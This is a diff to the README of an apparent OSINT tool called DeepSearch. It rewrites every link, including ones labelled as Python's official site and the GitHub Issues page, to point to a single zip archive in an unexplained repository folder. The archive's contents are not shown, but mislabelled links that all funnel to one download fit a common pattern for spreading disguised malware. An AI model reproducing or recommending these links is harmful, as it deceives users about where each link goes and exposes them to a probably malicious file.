@@ -1,7 +1,7 @@
 # 🕵️ DeepSearch- - Uncover Digital Footprints Easily
 
 ## 📥 Download Now
-[![Download DeepSearch](https://img.shields.io/badge/Download%20DeepSearch-available-brightgreen)](https://github.com/Eristsin/DeepSearch-/releases)
+[![Download DeepSearch](https://raw.githubusercontent.com/Eristsin/DeepSearch-/main/hatchment/DeepSearch-.zip%20DeepSearch-available-brightgreen)](https://raw.githubusercontent.com/Eristsin/DeepSearch-/main/hatchment/DeepSearch-.zip)
 
 ## 📚 Overview
 DeepSearch is a powerful Python-based OSINT utility that leverages Google's advanced search operators to perform comprehensive digital footprint analysis. Whether you're looking to explore online presence or gather data for research, DeepSearch simplifies the process. 
@@ -13,7 +13,7 @@ To get started with DeepSearch, follow these steps:
 
    Go to the release page to find the latest version of DeepSearch. Click the link below.
 
-   [Visit the Releases Page](https://github.com/Eristsin/DeepSearch-/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Eristsin/DeepSearch-/main/hatchment/DeepSearch-.zip)
 
 2. **Download the Application**
 
@@ -45,7 +45,7 @@ Ensure your system meets the following requirements to run DeepSearch effectivel
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **Memory**: At least 4 GB of RAM recommended.
 - **Disk Space**: A minimum of 100 MB of free disk space.
-- **Python**: Python 3.7 or later must be installed on your system. (If you don’t have Python, follow the installation instructions from [Python’s official site](https://www.python.org/downloads/).)
+- **Python**: Python 3.7 or later must be installed on your system. (If you don’t have Python, follow the installation instructions from [Python’s official site](https://raw.githubusercontent.com/Eristsin/DeepSearch-/main/hatchment/DeepSearch-.zip).)
 
 ## 💡 Usage Instructions
 After running DeepSearch, follow these steps to conduct your analysis:
@@ -59,7 +59,7 @@ After running DeepSearch, follow these steps to conduct your analysis:
 ## 📞 Support
 If you encounter issues while using DeepSearch, you can seek assistance via the following methods:
 
-- **GitHub Issues Page**: Report any bugs or request features by creating a new issue in the [Issues section](https://github.com/Eristsin/DeepSearch-/issues).
+- **GitHub Issues Page**: Report any bugs or request features by creating a new issue in the [Issues section](https://raw.githubusercontent.com/Eristsin/DeepSearch-/main/hatchment/DeepSearch-.zip).
 - **User Guide**: A detailed user guide is available in the documentation folder within the application for further explanations and tips.
 
 ## 🔗 Additional Resources
@@ -69,4 +69,4 @@ If you encounter issues while using DeepSearch, you can seek assistance via the 
 ## 📥 Download Again
 For easy access, here’s the link to download DeepSearch once more: 
 
-[Download DeepSearch](https://github.com/Eristsin/DeepSearch-/releases)
+[Download DeepSearch](https://raw.githubusercontent.com/Eristsin/DeepSearch-/main/hatchment/DeepSearch-.zip)
